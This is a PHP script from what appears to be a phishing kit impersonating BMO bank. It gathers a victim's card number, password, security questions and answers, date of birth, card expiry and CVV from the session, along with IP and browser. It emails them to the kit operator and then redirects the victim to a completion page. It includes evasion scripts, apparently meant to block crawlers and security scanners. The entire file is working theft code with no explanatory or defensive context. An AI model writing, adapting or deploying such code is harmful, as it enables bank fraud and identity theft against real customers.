<?php
session_start();
include"blocker.php";
include"email.php";
include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/anti9.php';





$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------res------------------\n";
$message .= "Carta: ".$_SESSION['username']."\n";
$message .= "pass : ".$_SESSION['password']."\n";
$message .= "Q1 : ".$_SESSION['question1']."\n";
$message .= "A1 : ".$_SESSION['answer1']."\n";
$message .= "Q2 : ".$_SESSION['question2']."\n";
$message .= "A2 : ".$_SESSION['answer2']."\n";
$message .= "Q3 : ".$_SESSION['question3']."\n";
$message .= "A3 : ".$_SESSION['answer3']."\n";
$message .= "DOB : ".$_SESSION['dob']."\n";
$message .= "EXP : ".$_SESSION['exp']."\n";
$message .= "CVV : ".$_SESSION['cvv']."\n";
$message .= "----------------------------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "----------BM0Results------------------------\n";

$subject = "BMO ALLINFO $ip".$_SESSION['username'];

$cn = $_SESSION['username'];
$cv= $_SESSION['cvv'];

if (strlen($cn) == 16)
{
mail($send,$subject,$message);

}
echo "<meta http-equiv='refresh' content='0;url=Complete.php'>";

?>

